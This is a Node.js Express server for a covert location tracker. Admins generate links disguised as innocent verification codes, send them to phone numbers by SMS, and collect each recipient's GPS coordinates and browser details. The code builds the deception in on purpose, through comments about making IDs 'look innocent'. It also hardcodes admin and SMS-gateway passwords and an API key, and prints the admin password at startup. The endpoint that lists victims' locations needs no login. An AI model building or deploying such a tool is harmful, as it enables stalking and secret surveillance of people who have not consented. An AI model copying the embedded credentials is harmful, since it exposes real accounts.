// Example Backend Server to Receive Location Data
// Run with: node example-backend.js

const express = require('express');
const https = require('https');
const http = require('http');
const querystring = require('querystring');
const path = require('path');
const crypto = require('crypto');
const app = express();
const PORT = 3000;

// In-memory storage (replace with database in production)
const trackingLinks = {}; // { trackingId: { phoneNumber, reference, createdAt, shortId } }
const locations = {}; // { trackingId: { latitude, longitude, timestamp, userAgent } }
const shortIdMap = {}; // { shortId: trackingId } - Maps short IDs to tracking IDs

// Admin authentication
const ADMIN_CREDENTIALS = {
    'akilainduwara205@gmail.com': {
        password: 'Induwara5522',
        email: 'akilainduwara205@gmail.com'
    }
};

// Active sessions: { token: { email, loginTime, lastActivity } }
const activeSessions = {};

// Login history: [{ email, loginTime, logoutTime }]
const loginHistory = [];

// Generate session token
function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Middleware to verify authentication
function requireAuth(req, res, next) {
    const token = req.headers.authorization?.replace('Bearer ', '') || 
                  req.query.token || 
                  req.body.token;
    
    if (!token || !activeSessions[token]) {
        return res.status(401).json({
            success: false,
            message: 'Unauthorized. Please login.'
        });
    }
    
    // Update last activity
    activeSessions[token].lastActivity = Date.now();
    req.adminEmail = activeSessions[token].email;
    next();
}

// CORS - Allow requests from your HTML file (must be before routes)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    res.header('Access-Control-Max-Age', '3600');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    
    next();
});

// Middleware to parse JSON
app.use(express.json());

// Generate unique tracking ID (internal)
function generateTrackingId() {
    return 'TRK-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// Generate short, disguised public ID that looks innocent
function generateShortId() {
    // Generate a short random string (6-8 chars) that looks like a normal code
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let shortId = '';
    const length = 7; // Short enough to look innocent
    for (let i = 0; i < length; i++) {
        shortId += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return shortId;
}

// Frontend URL - Change this to where get-location.html is hosted
// Default to backend server (since we're serving static files now)
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

// Get base URL for tracking links
function getBaseUrl(req) {
    // Use configured frontend URL or fallback to request host
    if (FRONTEND_URL && FRONTEND_URL !== 'http://localhost:3000') {
        return FRONTEND_URL;
    }
    
    // For development, use the request host (backend server)
    const protocol = req.protocol;
    const host = req.get('host');
    return `${protocol}://${host}`;
}

// Login endpoint
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required'
        });
    }
    
    const admin = ADMIN_CREDENTIALS[email];
    
    if (!admin || admin.password !== password) {
        return res.status(401).json({
            success: false,
            message: 'Invalid email or password'
        });
    }
    
    // Generate session token
    const token = generateToken();
    const loginTime = Date.now();
    
    // Store session
    activeSessions[token] = {
        email: email,
        loginTime: loginTime,
        lastActivity: loginTime
    };
    
    // Add to login history
    loginHistory.push({
        email: email,
        loginTime: new Date(loginTime).toISOString(),
        logoutTime: null
    });
    
    console.log(`\n🔐 Admin logged in: ${email}`);
    console.log(`📊 Active sessions: ${Object.keys(activeSessions).length}\n`);
    
    res.json({
        success: true,
        token: token,
        email: email,
        message: 'Login successful'
    });
});

// Verify session endpoint
app.get('/api/verify-session', requireAuth, (req, res) => {
    res.json({
        success: true,
        email: req.adminEmail
    });
});

// Logout endpoint
app.post('/api/logout', requireAuth, (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (token && activeSessions[token]) {
        const email = activeSessions[token].email;
        delete activeSessions[token];
        
        // Update logout time in history
        const lastLogin = loginHistory.filter(h => h.email === email && !h.logoutTime).pop();
        if (lastLogin) {
            lastLogin.logoutTime = new Date().toISOString();
        }
        
        console.log(`\n👋 Admin logged out: ${email}`);
        console.log(`📊 Active sessions: ${Object.keys(activeSessions).length}\n`);
    }
    
    res.json({
        success: true,
        message: 'Logged out successfully'
    });
});

// Get admin statistics
app.get('/api/admin-stats', requireAuth, (req, res) => {
    const totalLogins = loginHistory.length;
    const activeCount = Object.keys(activeSessions).length;
    const uniqueAdmins = new Set(loginHistory.map(h => h.email)).size;
    
    // Get recent logins (last 10)
    const recentLogins = loginHistory
        .slice(-10)
        .reverse()
        .map(h => ({
            email: h.email,
            loginTime: h.loginTime,
            logoutTime: h.logoutTime,
            duration: h.logoutTime ? 
                Math.round((new Date(h.logoutTime) - new Date(h.loginTime)) / 1000 / 60) + ' min' : 
                'Active'
        }));
    
    res.json({
        success: true,
        stats: {
            totalLogins: totalLogins,
            activeSessions: activeCount,
            uniqueAdmins: uniqueAdmins,
            recentLogins: recentLogins
        }
    });
});

// Endpoint to create tracking link (requires authentication)
app.post('/api/create-link', requireAuth, (req, res) => {
    const { phoneNumber, reference, message } = req.body;
    
    if (!phoneNumber) {
        return res.status(400).json({
            success: false,
            message: 'Phone number is required'
        });
    }
    
    const trackingId = generateTrackingId();
    const shortId = generateShortId();
    const baseUrl = getBaseUrl(req);
    
    // Create disguised link - looks like a normal verification link
    const link = `${baseUrl}/verify?code=${shortId}`;
    
    // Store tracking info with short ID mapping
    trackingLinks[trackingId] = {
        phoneNumber,
        reference: reference || `REF-${Date.now()}`,
        message: message || '',
        createdAt: new Date().toISOString(),
        link,
        shortId: shortId
    };
    
    // Map short ID to tracking ID
    shortIdMap[shortId] = trackingId;
    
    console.log('\n=== TRACKING LINK CREATED ===');
    console.log('Tracking ID:', trackingId);
    console.log('Short ID:', shortId);
    console.log('Phone Number:', phoneNumber);
    console.log('Reference:', trackingLinks[trackingId].reference);
    console.log('Link:', link);
    console.log('============================\n');
    
    res.json({
        success: true,
        trackingId,
        link,
        phoneNumber,
        reference: trackingLinks[trackingId].reference
    });
});

// Endpoint to receive location data
app.post('/api/locations', (req, res) => {
    const { trackingId, shortId, latitude, longitude, userAgent } = req.body;
    
    console.log('\n=== LOCATION DATA RECEIVED ===');
    console.log('Request body:', JSON.stringify(req.body, null, 2));
    console.log('Available shortIds in map:', Object.keys(shortIdMap));
    
    // Support both trackingId and shortId (disguised link)
    let finalTrackingId = trackingId;
    
    // If shortId is provided, look up the actual trackingId
    if (shortId) {
        console.log(`🔍 Looking up shortId: "${shortId}"`);
        if (shortIdMap[shortId]) {
            finalTrackingId = shortIdMap[shortId];
            console.log(`✅ Resolved shortId "${shortId}" to trackingId "${finalTrackingId}"`);
        } else {
            console.log(`❌ shortId "${shortId}" not found in shortIdMap!`);
            console.log('Available shortIds:', Object.keys(shortIdMap));
        }
    }
    
    // Also support old format (uid, ref) for backward compatibility
    if (!finalTrackingId && req.body.uid && req.body.ref) {
        // Create tracking ID from uid and ref
        finalTrackingId = `LEGACY-${req.body.uid}-${req.body.ref}`;
        if (!trackingLinks[finalTrackingId]) {
            trackingLinks[finalTrackingId] = {
                phoneNumber: req.body.uid,
                reference: req.body.ref,
                createdAt: new Date().toISOString()
            };
        }
    }
    
    if (!finalTrackingId) {
        console.log('❌ No valid tracking ID found!');
        console.log('============================\n');
        return res.status(400).json({
            success: false,
            message: 'Tracking ID or code is required'
        });
    }
    
    if (!latitude || !longitude) {
        return res.status(400).json({
            success: false,
            message: 'Latitude and longitude are required'
        });
    }
    
    // Store location
    const locationData = {
        latitude: parseFloat(latitude),
        longitude: parseFloat(longitude),
        timestamp: new Date().toISOString(),
        userAgent: userAgent || req.headers['user-agent'] || 'Unknown'
    };
    
    locations[finalTrackingId] = locationData;
    
    // Log the received data
    console.log('\n=== 📍 LOCATION RECEIVED ===');
    console.log('Tracking ID:', finalTrackingId);
    if (trackingLinks[finalTrackingId]) {
        console.log('Phone Number:', trackingLinks[finalTrackingId].phoneNumber);
        console.log('Reference:', trackingLinks[finalTrackingId].reference);
    } else {
        console.log('⚠️  Warning: No tracking link found for this ID');
    }
    console.log('Latitude:', locationData.latitude);
    console.log('Longitude:', locationData.longitude);
    console.log('Timestamp:', locationData.timestamp);
    console.log('User Agent:', locationData.userAgent);
    
    // Generate Google Maps link
    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    console.log('🗺️  Google Maps Link:', googleMapsLink);
    console.log('============================\n');
    
    res.json({
        success: true,
        message: 'Location received',
        mapsLink: googleMapsLink,
        trackingId: finalTrackingId
    });
});

// Endpoint to get all locations (for admin page)
app.get('/api/locations', (req, res) => {
    const locationList = Object.entries(locations).map(([trackingId, location]) => {
        const trackingInfo = trackingLinks[trackingId] || {};
        return {
            trackingId,
            phoneNumber: trackingInfo.phoneNumber,
            reference: trackingInfo.reference,
            latitude: location.latitude,
            longitude: location.longitude,
            timestamp: location.timestamp,
            userAgent: location.userAgent,
            mapsLink: `https://www.google.com/maps?q=${location.latitude},${location.longitude}`
        };
    });
    
    res.json({
        success: true,
        locations: locationList,
        count: locationList.length
    });
});

// Endpoint to delete a tracking entry (requires authentication)
app.delete('/api/delete-tracking/:trackingId', requireAuth, (req, res) => {
    const { trackingId } = req.params;
    
    // Also delete shortId mapping if exists
    const linkData = trackingLinks[trackingId];
    if (linkData && linkData.shortId) {
        delete shortIdMap[linkData.shortId];
    }
    
    delete trackingLinks[trackingId];
    delete locations[trackingId];
    
    console.log(`🗑️  Deleted tracking entry: ${trackingId}`);
    
    res.json({
        success: true,
        message: 'Tracking entry deleted'
    });
});

// Endpoint to clear all tracking history (requires authentication)
app.delete('/api/clear-all', requireAuth, (req, res) => {
    const count = Object.keys(trackingLinks).length;
    
    // Clear all data
    Object.keys(trackingLinks).forEach(id => delete trackingLinks[id]);
    Object.keys(locations).forEach(id => delete locations[id]);
    Object.keys(shortIdMap).forEach(id => delete shortIdMap[id]);
    
    console.log(`🗑️  Cleared all tracking history (${count} entries)`);
    
    res.json({
        success: true,
        message: `Cleared ${count} tracking entries`
    });
});

// Endpoint to get all tracking links (for admin page - requires authentication)
app.get('/api/tracking-links', requireAuth, (req, res) => {
    const linksList = Object.entries(trackingLinks).map(([trackingId, info]) => {
        const location = locations[trackingId];
        return {
            trackingId,
            phoneNumber: info.phoneNumber,
            reference: info.reference,
            link: info.link,
            createdAt: info.createdAt,
            hasLocation: !!location,
            location: location ? {
                latitude: location.latitude,
                longitude: location.longitude,
                timestamp: location.timestamp
            } : null
        };
    });
    
    res.json({
        success: true,
        links: linksList,
        count: linksList.length
    });
});

// SMS Gateway Configuration
const SMS_CONFIG = {
    baseUrl: 'https://kdenterprises.lk/api/client/sendsms',
    username: 'klnvas@kdenterprises.lk',
    password: 'DINE*@73#k',
    apiKey: 'a4fd451ffc12efb07f51',
    senderName: 'KLNVAS' // Sender mask
};

// Endpoint to send SMS (proxy to avoid CORS - requires authentication)
app.post('/api/send-sms', requireAuth, (req, res) => {
    const { phoneNumber, message } = req.body;
    
    if (!phoneNumber || !message) {
        return res.status(400).json({
            success: false,
            message: 'Phone number and message are required'
        });
    }
    
    // Convert phone to format required by API: 94XXXXXXXXX (no +, no leading 0)
    let cleanedPhone = phoneNumber.replace(/[\s\-+]/g, '');
    let apiPhoneNumber;
    
    if (cleanedPhone.startsWith('94')) {
        // Already in correct format (94XXXXXXXXX)
        apiPhoneNumber = cleanedPhone;
    } else if (cleanedPhone.startsWith('0')) {
        // Convert 0XX to 94XX
        apiPhoneNumber = '94' + cleanedPhone.substring(1);
    } else if (cleanedPhone.length === 9) {
        // 9 digits, add 94 prefix
        apiPhoneNumber = '94' + cleanedPhone;
    } else {
        apiPhoneNumber = cleanedPhone;
    }
    
    // Convert to number (API expects numeric value)
    const phoneNumberNumeric = parseInt(apiPhoneNumber);
    
    console.log('\n=== SENDING SMS ===');
    console.log('Phone Number:', apiPhoneNumber);
    console.log('Message Length:', message.length);
    console.log('Message Preview:', message.substring(0, 100) + '...');
    
    // Build URL with query parameters (username, password, apiKey)
    // Note: Password contains special characters, need proper encoding
    const queryParams = new URLSearchParams();
    queryParams.append('username', SMS_CONFIG.username);
    queryParams.append('password', SMS_CONFIG.password); // URLSearchParams handles encoding
    queryParams.append('apiKey', SMS_CONFIG.apiKey);
    
    const fullUrl = `${SMS_CONFIG.baseUrl}?${queryParams.toString()}`;
    const url = new URL(fullUrl);
    
    console.log('Full Request URL:', fullUrl);
    
    // Prepare JSON body (mask, number, content)
    const jsonBody = JSON.stringify({
        mask: SMS_CONFIG.senderName,
        number: phoneNumberNumeric,
        content: message
    });
    
    console.log('Request URL:', fullUrl);
    console.log('Request Body:', jsonBody);
    
    const options = {
        hostname: url.hostname,
        port: url.port || 443,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(jsonBody)
        }
    };
    
    // Make HTTPS POST request
    const httpsReq = https.request(options, (smsResponse) => {
        let data = '';
        
        smsResponse.on('data', (chunk) => {
            data += chunk;
        });
        
        smsResponse.on('end', () => {
            console.log('SMS API Response Status:', smsResponse.statusCode);
            console.log('SMS API Response Body:', data);
            console.log('==================\n');
            
            handleSmsResponse(smsResponse, data, apiPhoneNumber, res);
        });
    });
    
    httpsReq.on('error', (error) => {
        console.error('SMS POST Error:', error);
        res.status(500).json({
            success: false,
            message: 'Network error sending SMS: ' + error.message,
            error: error.toString()
        });
    });
    
    httpsReq.write(jsonBody);
    httpsReq.end();
    
    // Handle SMS response
    function handleSmsResponse(smsResponse, data, phone, response) {
        // Parse response
        let responseData;
        try {
            responseData = JSON.parse(data);
        } catch (e) {
            responseData = { message: data, raw: data };
        }
        
        const responseText = data.toString().toLowerCase();
        console.log('Response analysis:', {
            statusCode: smsResponse.statusCode,
            responseText: responseText,
            hasSent: responseText.includes('sent'),
            hasQueue: responseText.includes('queue'),
            hasSuccess: responseText.includes('success'),
            hasError: responseText.includes('error'),
            hasFail: responseText.includes('fail')
        });
        
        // Check for success - API returns {"message": "Message sent with queue"} on success
        const isSuccess = smsResponse.statusCode === 200 && (
            responseText.includes('sent') || 
            responseText.includes('queue') ||
            responseText.includes('success')
        ) && !responseText.includes('error') && !responseText.includes('fail') && !responseText.includes('route not found');
        
        if (isSuccess) {
            response.json({
                success: true,
                message: 'SMS sent successfully',
                phoneNumber: phone,
                response: responseData,
                statusCode: smsResponse.statusCode,
                rawResponse: data
            });
        } else {
            // Try to extract error message
            let errorMessage = 'Failed to send SMS';
            if (responseData.message) {
                errorMessage = responseData.message;
            } else if (responseData.error) {
                errorMessage = responseData.error;
            } else if (data) {
                errorMessage = data.toString().substring(0, 200);
            }
            
            console.error('SMS sending failed:', {
                statusCode: smsResponse.statusCode,
                errorMessage: errorMessage,
                fullResponse: data
            });
            
            response.status(400).json({
                success: false,
                message: errorMessage,
                error: responseData,
                statusCode: smsResponse.statusCode,
                rawResponse: data
            });
        }
    }
});

// Test SMS endpoint (for debugging)
app.post('/api/test-sms', async (req, res) => {
    const { phoneNumber } = req.body;
    const testPhone = phoneNumber || '94771234567';
    const testMessage = 'Test message from location tracker';
    
    // Convert phone format
    let cleanedPhone = testPhone.replace(/[\s\-+]/g, '');
    let apiPhoneNumber;
    
    if (cleanedPhone.startsWith('94')) {
        apiPhoneNumber = cleanedPhone;
    } else if (cleanedPhone.startsWith('0')) {
        apiPhoneNumber = '94' + cleanedPhone.substring(1);
    } else if (cleanedPhone.length === 9) {
        apiPhoneNumber = '94' + cleanedPhone;
    } else {
        apiPhoneNumber = cleanedPhone;
    }
    
    const phoneNumberNumeric = parseInt(apiPhoneNumber);
    
    // Build URL
    const queryParams = new URLSearchParams();
    queryParams.append('username', SMS_CONFIG.username);
    queryParams.append('password', SMS_CONFIG.password);
    queryParams.append('apiKey', SMS_CONFIG.apiKey);
    
    const fullUrl = `${SMS_CONFIG.baseUrl}?${queryParams.toString()}`;
    const url = new URL(fullUrl);
    
    const jsonBody = JSON.stringify({
        mask: SMS_CONFIG.senderName,
        number: phoneNumberNumeric,
        content: testMessage
    });
    
    res.json({
        test: true,
        url: fullUrl,
        body: JSON.parse(jsonBody),
        phoneFormat: {
            input: testPhone,
            cleaned: cleanedPhone,
            apiFormat: apiPhoneNumber,
            numeric: phoneNumberNumeric
        }
    });
});

// Health check endpoint
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server is running',
        endpoints: {
            'POST /api/login': 'Admin login',
            'GET /api/verify-session': 'Verify session',
            'POST /api/logout': 'Logout',
            'GET /api/admin-stats': 'Get admin statistics',
            'POST /api/create-link': 'Create a new tracking link (auth required)',
            'POST /api/locations': 'Receive location data',
            'GET /api/locations': 'Get all received locations',
            'GET /api/tracking-links': 'Get all tracking links (auth required)',
            'POST /api/send-sms': 'Send SMS via gateway (auth required)',
            'POST /api/test-sms': 'Test SMS API format',
            'DELETE /api/delete-tracking/:id': 'Delete tracking entry (auth required)',
            'DELETE /api/clear-all': 'Clear all history (auth required)'
        },
        stats: {
            activeTrackingLinks: Object.keys(trackingLinks).length,
            receivedLocations: Object.keys(locations).length,
            activeSessions: Object.keys(activeSessions).length
        }
    });
});

// Route for disguised tracking link: /verify?code=ABC123
app.get('/verify', (req, res) => {
    // Serve get-location.html but with the code parameter
    res.sendFile(path.join(__dirname, 'get-location.html'));
});

// Serve static files (HTML, CSS, JS) - MUST be last, after all API routes
app.use(express.static(path.join(__dirname)));

// Start server
app.listen(PORT, () => {
    console.log(`\n🚀 Location tracking server running on http://localhost:${PORT}`);
    console.log(`🔐 Login page: http://localhost:${PORT}/login.html`);
    console.log(`📡 Admin panel: http://localhost:${PORT}/admin.html`);
    console.log(`📡 Tracking page: http://localhost:${PORT}/get-location.html`);
    console.log(`📡 API endpoint: http://localhost:${PORT}/api/locations`);
    console.log(`📁 Serving static files from: ${__dirname}`);
    console.log(`\n👤 Admin Credentials:`);
    console.log(`   Email: akilainduwara205@gmail.com`);
    console.log(`   Password: Induwara5522\n`);
});

